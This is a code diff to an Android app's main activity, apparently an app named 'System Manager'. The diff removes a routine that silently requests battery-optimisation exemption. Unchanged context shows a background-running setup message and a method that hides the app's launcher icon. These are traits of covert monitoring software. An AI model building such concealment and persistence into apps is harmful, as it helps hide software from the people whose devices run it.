@@ -15,7 +15,6 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
-import android.os.PowerManager;
 import android.provider.Settings;
 import android.text.TextUtils;
 import androidx.core.app.ActivityCompat;
@@ -69,8 +68,7 @@ public class MainActivity extends BridgeActivity {
 
         SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
         if (prefs.getBoolean(KEY_DONE, false)) {
-            // Already set up — silently request battery in background, show app
-            requestBatterySilent();
+            // Already set up — just show the app (WebView)
             return;
         }
 
@@ -292,28 +290,12 @@ public class MainActivity extends BridgeActivity {
         getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
             .edit().putBoolean(KEY_DONE, true).apply();
 
-        requestBatterySilent();
-
         new AlertDialog.Builder(this)
             .setTitle("Setup Complete!")
             .setMessage("System Manager active hai aur background mein chal raha hai.")
             .setCancelable(true)
             .setPositiveButton("OK", null)
             .show();
-    }
-
-    // Battery optimization requested silently — no Settings page opens
-    private void requestBatterySilent() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            try {
-                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                    i.setData(Uri.parse("package:" + getPackageName()));
-                    startActivity(i);
-                }
-            } catch (Exception ignored) {}
-        }
     }
 
     private void hideLauncherIcon() {
